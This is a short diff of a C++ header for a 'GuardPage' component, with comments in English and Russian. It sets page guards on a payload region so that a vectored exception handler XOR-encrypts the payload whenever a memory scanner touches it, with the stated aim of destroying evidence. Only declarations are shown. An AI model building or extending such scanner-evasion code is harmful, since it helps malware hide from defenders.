@@ -13,12 +13,15 @@
 
 namespace GuardPage
 {
-    // Install a Vectored Exception Handler that monitors PAGE_GUARD violations.
-    // When a memory scanner touches the guarded payload region, the handler
-    // XOR-encrypts the payload in-place to destroy evidence.
-    // No admin needed — VEH works in user mode on own process memory.
+    // Установить PAGE_GUARD на payload-регион.
+    // При срабатывании STATUS_GUARD_PAGE_VIOLATION (сканер памяти),
+    // VehDispatcher вызывает HandleGuardPage — payload XOR-шифруется.
+    // VEH-обработчик теперь управляется VehDispatcher (единый обработчик).
     void Install(void* payloadBase, size_t payloadSize, unsigned char* xorKey, size_t keyLen);
 
-    // Remove the VEH handler (call before normal payload execution starts)
+    // Снять PAGE_GUARD и очистить состояние
     void Uninstall();
+
+    // VEH-колбэк для STATUS_GUARD_PAGE_VIOLATION — вызывается из VehDispatcher
+    LONG HandleGuardPage(PEXCEPTION_POINTERS pExInfo);
 }
